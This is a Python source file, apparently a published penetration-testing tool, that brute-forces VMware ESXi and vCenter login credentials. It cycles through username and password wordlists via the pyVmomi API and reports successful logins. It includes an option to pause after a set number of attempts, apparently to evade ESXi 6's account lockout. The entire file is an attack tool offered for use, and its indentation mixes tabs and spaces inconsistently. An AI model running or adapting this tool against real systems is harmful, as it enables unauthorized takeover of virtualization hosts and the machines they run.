#!/usr/bin/env python
#bruteforce esxi accounts
#tested with esxi 6 and 5.5
#Author: Daniel Sauder
#Website: http://virtualception.wordpress.com

import atexit
import argparse
import getpass
import time

from pyVim import connect
from pyVmomi import vmodl
from pyVmomi import vim


def build_arg_parser():
    """
    -s service_host_name_or_ip
    -o optional_port_number
    -u required_user
    -p password
    -U userfile
    -P passwordfile
    -i iterate trough user and password file simoultanisly:
       1st round take 1st line from user file and 1st line from password file
       then 2nd line of each for 2nd round
       and so on
    """
    
    parser = argparse.ArgumentParser(
        description='Bruteforce vCenter/ESXi passwords')

    # because -h is reserved for 'help' we use -s for service
    parser.add_argument('-s', '--host',
                        required=True,
                        action='store',
                        help='vSphere service to connect to')

    # because we want -p for password, we use -o for port
    parser.add_argument('-o', '--port',
                        type=int,
                        default=443,
                        action='store',
                        help='Port to connect on')              
                        
    parser.add_argument('-u', '--user',
                        required=False,
                        action='store',
                        help='User name to use when connecting to host, default=root')

    parser.add_argument('-p', '--password',
                        required=False,
                        action='store',
                        help='Password to use when connecting to host, default=vmware')
                        
    parser.add_argument('-U', '--userfile',
                        required=False,
                        action='store',
                        help='File with usernames')    

    parser.add_argument('-P', '--passfile',
                        required=False,
                        action='store',
                        help='File with passwords')   
                  
    parser.add_argument('-l', '--userlist',
                        required=False,
                        action='store_true',
                        help="iterate through user and password file simoultanisly: "
       "1st round take 1st line from user file and 1st line from password file, "
       "then 2nd line of each file for 2nd round, and so on.\nDEFAULT (without -l): Try each password for each user")  

    parser.add_argument('-w', '--wait',
                        required=False,
                        action='store_true',
			#action='store',
                        help='Wait 120 seconds after 10 login attempts, use that eg for esxi 6')

    parser.add_argument('-r', '--rounds',
			required=False,
			action='store',
			help='Use with -w, you can specify the rounds for waiting (wait 120 seconds after x login attempts)')

    parser.add_argument('-S', '--seconds',
    			required=False,
			action='store',
			help='Use with -w, you can specify how many seconds to wait')

    return parser



def get_args():
    parser = build_arg_parser()
    args = parser.parse_args()
    return args

	

def check_credentials(h,u,pw,pt):
    service_instance=0
    try:
        service_instance = connect.SmartConnect(host=h, user=u, pwd=pw, port=int(pt))

    except vmodl.MethodFault as error:
        print("  failed  - user " + u + " password: " + pw)
        connect.Disconnect(service_instance)
        return -1

    print("* SUCCESS - user " + u + " password: " + pw)
    connect.Disconnect(service_instance)
    return 0


def main():	
    args = get_args()
    
    #testing
    #check_credentials("172.16.189.142","root","daf","443")
    #check_credentials(args.host,args.user,args.password,args.port)
    
    if args.user and args.password and args.host:
        check_credentials(args.host, args.user, args.password, args.port)
 
    # do the wait seconds rounds stuff
    c = 0
    rounds = 0
    secs = 0

    if args.rounds:
        rounds=int(args.rounds)
    else:
        rounds=10

    if args.seconds:
        secs=int(args.seconds)
    else:
        secs=120

    # with -u and -P
    if args.user and args.passfile and args.host:
        f_passfile = open(args.passfile, 'r')
        #c = 0
        for line in f_passfile:
            #check_credentials(args.host, args.user, line, args.port)
            #l= int(len(line))-1
            #linecut=line[0:l]
            #print(linecut)
            if check_credentials(args.host, args.user, line.rstrip(), args.port) == 0:
                return 0
                
            c += 1
            #print("c " + str(c))
            if args.wait and c==rounds:
                c = 0
                print("waiting " + str(secs) + " seconds...")
                time.sleep(secs)
                
    # with -U and -P
    elif args.userfile and args.passfile and args.host and not args.userlist:
        #print("holla2")
        f_userfile = open(args.userfile, 'r')
        for line_user in f_userfile:
            #c = 0
            f_passfile = open(args.passfile, 'r')
            for line_pass in f_passfile:
                check_credentials(args.host, line_user.rstrip(), line_pass.rstrip(), args.port)
                #print ("#"+line_user.rstrip() + "#" + line_pass.rstrip()+"#")
                c += 1
                if args.wait and c==rounds:
                    c = 0
                    print("waiting " + str(secs) + " seconds...")
                    time.sleep(secs)                
    
    elif args.userlist:
        #print("holla3")
	f_userfile = open(args.userfile, 'r')
        f_passfile = open(args.passfile, 'r')

	while True:
            line_user = f_userfile.readline()
            line_pass = f_passfile.readline()
            if not line_user: break  # EOF
	    if not line_pass: break
	    check_credentials(args.host, line_user.rstrip(), line_pass.rstrip(), args.port)
	    #print (line1.rstrip() + " " + line2.rstrip())
	    c += 1
	    if args.wait and c==rounds:
	        c = 0
                print("waiting " + str(secs) + " seconds...")
		time.sleep(secs)


    #else:
    #	print("call bruteforce.py -h for help")

    
    return 0

# Start program
if __name__ == "__main__":
    main()
